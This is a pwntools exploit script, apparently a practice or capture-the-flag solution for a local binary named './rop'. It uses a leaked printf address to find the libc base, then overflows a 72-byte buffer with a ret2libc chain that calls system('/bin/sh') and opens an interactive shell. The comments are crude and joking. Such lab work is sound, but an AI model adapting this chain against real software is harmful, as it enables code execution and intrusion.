from pwn import *

p = process('./rop')
e = ELF('./rop')
libc = ELF('/usr/lib/libc.so.6')
rop = ROP(libc) # there's no gadget in my binary. IN MY ENVIRONMENT. IN MY BINARY. thus I use LIBc.CCCCCCIBBALLL

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# write_got = e.got['write'] < won't be overwritten.. so
write_plt = e.plt['write']
read_plt = e.plt['read']
read_got = e.got['read']

def slog(n, a): return success(': '.join([n, hex(a)]))

pay = b'A'*0x48 # 72 buf2ret, getting into this is kinda boring; Even exploitation process felt very...nah... ain't gonna tell this SH!T in my Random GITHUB REPO.

p.recvuntil(b'Printf() address : ') # without this, I couldn't get any leaks.
printf = int(p.recvline()[:-1], 16)
lb = printf - libc.sym['printf']
system = lb + libc.sym['system'] # yeah. YOou CAN easily use read@got to calculate the distance between read and SYSTEM!, but in here, 
# the binary looks so LIBC BASE LEAKING. kinda NORMAL EXPLOITATION.
# therefore, I, Great Exploiter!! let this code use the normal way. heheheha....
# the fu..ck... I was tripping. forget. thiz. nuts.
pop_rdi = lb + rop.find_gadget(['pop rdi', 'ret'])[0]
ret = lb + rop.find_gadget(['ret'])[0]
binsh = lb + next(libc.search(b'/bin/sh\x00'))

slog("printf", printf)
slog("libc_base", lb)
slog("system", system)

# attach. it feels so good. Just the only way to make boring exploitation process enjoyable.
gdb.attach(p, '''
b *vuln+85
c
''')
pause() # and then I press... ENTER!!!!

# i r rsp
# and divide the value with '16', then you get rest of '8'.
# which means "not aligned". to fix that, it's fre@king essential to add ret instruction, no?
pay += p64(ret) + p64(pop_rdi) + p64(binsh)
pay += p64(system)

p.sendline(pay)
pause()

p.interactive()

# BANKAI
